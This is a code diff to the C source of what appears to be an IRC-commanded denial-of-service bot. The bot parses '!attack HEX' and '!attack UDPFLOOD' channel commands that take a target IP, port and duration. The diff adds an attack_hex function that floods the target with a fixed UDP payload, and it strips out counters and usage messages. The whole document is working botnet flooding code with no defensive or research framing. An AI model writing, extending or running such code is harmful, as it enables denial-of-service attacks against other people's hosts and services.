@@ -41,8 +41,7 @@ void generate_random_nick(char *nick, size_t length) {
 void *udp_flood_thread(void *arg) {
     struct sockaddr_in addr;
     int sockfd;
-    char payload[] = "A";
-    int total_sent = 0;
+    char payload[] = "A";  // Payload for UDP flood
     int timeout = ((int*)arg)[0];
     const char *host = ((char**)arg)[1];
     int port = ((int*)arg)[2];
@@ -60,7 +59,6 @@ void *udp_flood_thread(void *arg) {
     time_t end_time = time(NULL) + timeout;
     while (time(NULL) < end_time) {
         sendto(sockfd, payload, sizeof(payload) - 1, 0, (struct sockaddr*)&addr, sizeof(addr));
-        total_sent += sizeof(payload) - 1;
     }
 
     close(sockfd);
@@ -85,6 +83,30 @@ void udp_flood_manager(const char *host, int port, int timeout, int max_threads)
     }
 }
 
+// Attack HEX function
+void attack_hex(const char *host, int port, int duration) {
+    int sockfd;
+    struct sockaddr_in addr;
+    char payload[] = "\x55\x55\x55\x55\x00\x00\x00\x01";
+
+    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sockfd < 0) {
+        perror("Socket error");
+        return;
+    }
+
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
+    inet_pton(AF_INET, host, &addr.sin_addr);
+
+    time_t end_time = time(NULL) + duration;
+    while (time(NULL) < end_time) {
+        sendto(sockfd, payload, sizeof(payload) - 1, 0, (struct sockaddr*)&addr, sizeof(addr));
+    }
+
+    close(sockfd);
+}
+
 int main() {
     int sockfd;
     struct sockaddr_in server_addr;
@@ -94,7 +116,6 @@ int main() {
     char ip[MAX_IP_LEN];
     int port;
     int duration;
-    int usage_sent = 0;
 
     // Seed the random number generator
     srand(time(NULL));
@@ -149,28 +170,14 @@ int main() {
         if (strstr(recv_buffer, "!attack HEX") != NULL) {
             // Extract the command parameters
             if (sscanf(recv_buffer, "!attack HEX %15s %d %d", ip, &port, &duration) == 3) {
-                // Call the UDP flood manager for HEX attacks (use a single-threaded flood in this case)
-                udp_flood_manager(ip, port, duration, NUM_THREADS);
-                usage_sent = 0; // Reset usage message flag after a valid attack
-            } else {
-                // Send usage instructions to the channel only once
-                if (!usage_sent) {
-                    send_data(sockfd, "PRIVMSG %s :Usage: !attack HEX <ip> <port> <duration>\r\n", CHANNEL);
-                    usage_sent = 1; // Set flag to avoid multiple usage messages
-                }
+                // Call the HEX attack function
+                attack_hex(ip, port, duration);
             }
         } else if (strstr(recv_buffer, "!attack UDPFLOOD") != NULL) {
             // Extract the command parameters
             if (sscanf(recv_buffer, "!attack UDPFLOOD %15s %d %d", ip, &port, &duration) == 3) {
                 // Call the UDP flood manager for UDPFLOOD attacks
                 udp_flood_manager(ip, port, duration, NUM_THREADS);
-                usage_sent = 0; // Reset usage message flag after a valid attack
-            } else {
-                // Send usage instructions to the channel only once
-                if (!usage_sent) {
-                    send_data(sockfd, "PRIVMSG %s :Usage: !attack UDPFLOOD <ip> <port> <duration>\r\n", CHANNEL);
-                    usage_sent = 1; // Set flag to avoid multiple usage messages
-                }
             }
         }
 
